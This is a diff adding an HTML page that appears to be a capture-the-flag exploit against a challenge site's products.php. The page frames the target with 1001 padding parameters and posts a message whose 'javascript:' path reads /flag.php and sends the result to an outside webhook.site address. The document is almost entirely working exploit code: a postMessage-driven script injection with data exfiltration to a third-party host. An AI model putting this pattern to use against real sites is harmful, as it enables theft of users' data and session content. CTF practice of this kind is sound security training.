@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <iframe id="target" height="1000" width="500"></iframe>
+
+  <script>
+    const webhook = 'https://webhook.site/dec07b72-1348-48be-98ff-097bea86b801';
+
+    const target = document.getElementById('target');
+    const url = new URL('https://aura-farm.ctf.ingeniums.club/products.php');
+    // const url = new URL('http://localhost:8090/products.php');
+
+    for (let i = 1; i <= 1001; i++) {
+      url.searchParams.set(`p${i}`, String(i));
+    }
+
+    target.src = url.toString();
+
+    target.addEventListener('load', () => {
+      target.contentWindow.postMessage({
+        type: 'payment',
+        status: 'success',
+        path: `javascript:fetch('/flag.php').then(r=>r.text()).then(flag=>fetch('${webhook}?flag='+encodeURIComponent(flag)))`
+      }, '*');
+    });
+  </script>
+</body>
+</html>
